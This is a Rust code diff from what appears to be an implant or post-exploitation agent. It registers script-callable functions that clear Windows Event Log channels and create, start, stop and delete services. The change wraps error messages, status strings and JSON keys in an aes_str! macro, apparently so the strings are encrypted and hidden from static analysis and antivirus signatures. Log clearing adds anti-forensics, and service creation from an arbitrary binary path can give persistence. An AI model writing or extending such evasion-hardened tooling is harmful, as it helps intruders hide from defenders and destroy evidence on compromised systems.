@@ -45,7 +45,7 @@ pub fn register(engine: &mut Engine) {
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: eventlog_query is Windows only ({}, {})", log_name, xpath)
+        format!("{}{}, {})", aes_str!("Error: eventlog_query is Windows only ("), log_name, xpath)
     });
 
     // Clear a Windows Event Log channel (requires admin).
@@ -61,12 +61,12 @@ pub fn register(engine: &mut Engine) {
                     std::ptr::null(),
                     0,
                 );
-                if ok != 0 { format!("Cleared: {}", log_name) }
+                if ok != 0 { format!("{}{}", aes_str!("Cleared: "), log_name) }
                 else { aes_str!("Error: EvtClearLog failed (check admin rights)") }
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: eventlog_clear is Windows only ({})", log_name)
+        format!("{}{})", aes_str!("Error: eventlog_clear is Windows only ("), log_name)
     });
 
     // ── Windows Services ──────────────────────────────────────────────────────
@@ -113,14 +113,14 @@ pub fn register(engine: &mut Engine) {
                 if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed"); }
                 let h_svc = OpenServiceA(h_scm, cname.as_ptr(), SERVICE_ALL_ACCESS);
                 CloseServiceHandle(h_scm);
-                if h_svc.is_null() { return format!("Error: service '{}' not found", name); }
+                if h_svc.is_null() { return format!("{}{}{}", aes_str!("Error: service '"), name, aes_str!("' not found")); }
                 let ok = StartServiceA(h_svc, 0, std::ptr::null());
                 CloseServiceHandle(h_svc);
-                if ok != 0 { format!("Started: {}", name) } else { aes_str!("Error: StartService failed") }
+                if ok != 0 { format!("{}{}", aes_str!("Started: "), name) } else { aes_str!("Error: StartService failed") }
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: service_start is Windows only ({})", name)
+        format!("{}{})", aes_str!("Error: service_start is Windows only ("), name)
     });
 
     engine.register_fn(&aes_str!("internal_service_stop"), |name: &str| -> String {
@@ -134,18 +134,18 @@ pub fn register(engine: &mut Engine) {
                 if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed"); }
                 let h_svc = OpenServiceA(h_scm, cname.as_ptr(), SERVICE_ALL_ACCESS);
                 CloseServiceHandle(h_scm);
-                if h_svc.is_null() { return format!("Error: service '{}' not found", name); }
+                if h_svc.is_null() { return format!("{}{}{}", aes_str!("Error: service '"), name, aes_str!("' not found")); }
                 let mut status = ServiceStatus {
                     dw_service_type: 0, dw_current_state: 0, dw_controls_accepted: 0,
                     dw_win32_exit_code: 0, dw_service_specific_exit: 0, dw_check_point: 0, dw_wait_hint: 0,
                 };
                 let ok = ControlService(h_svc, SERVICE_CONTROL_STOP, &mut status);
                 CloseServiceHandle(h_svc);
-                if ok != 0 { format!("Stopped: {}", name) } else { aes_str!("Error: ControlService failed") }
+                if ok != 0 { format!("{}{}", aes_str!("Stopped: "), name) } else { aes_str!("Error: ControlService failed") }
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: service_stop is Windows only ({})", name)
+        format!("{}{})", aes_str!("Error: service_stop is Windows only ("), name)
     });
 
     engine.register_fn(&aes_str!("internal_service_create"), |name: &str, display: &str, binary_path: &str, auto_start: bool| -> String {
@@ -170,11 +170,11 @@ pub fn register(engine: &mut Engine) {
                 CloseServiceHandle(h_scm);
                 if h_svc.is_null() { return aes_str!("Error: CreateService failed"); }
                 CloseServiceHandle(h_svc);
-                format!("Created service: {}", name)
+                format!("{}{}", aes_str!("Created service: "), name)
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: service_create is Windows only ({})", name)
+        format!("{}{})", aes_str!("Error: service_create is Windows only ("), name)
     });
 
     engine.register_fn(&aes_str!("internal_service_delete"), |name: &str| -> String {
@@ -188,14 +188,14 @@ pub fn register(engine: &mut Engine) {
                 if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed"); }
                 let h_svc = OpenServiceA(h_scm, cname.as_ptr(), SERVICE_ALL_ACCESS);
                 CloseServiceHandle(h_scm);
-                if h_svc.is_null() { return format!("Error: service '{}' not found", name); }
+                if h_svc.is_null() { return format!("{}{}{}", aes_str!("Error: service '"), name, aes_str!("' not found")); }
                 let ok = DeleteService(h_svc);
                 CloseServiceHandle(h_svc);
-                if ok != 0 { format!("Deleted: {}", name) } else { aes_str!("Error: DeleteService failed") }
+                if ok != 0 { format!("{}{}", aes_str!("Deleted: "), name) } else { aes_str!("Error: DeleteService failed") }
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: service_delete is Windows only ({})", name)
+        format!("{}{})", aes_str!("Error: service_delete is Windows only ("), name)
     });
 }
 
@@ -246,9 +246,9 @@ fn parse_service_list(buf: &[u8], count: u32) -> Vec<serde_json::Value> {
                 String::from_utf8_lossy(&buf[rel..rel+end]).to_string()
             } else { String::new() };
             Some(serde_json::json!({
-                "name":  name,
-                "state": state,
-                "pid":   pid,
+                aes_str!("name").as_str():  name,
+                aes_str!("state").as_str(): state,
+                aes_str!("pid").as_str():   pid,
             }))
         })
         .collect()
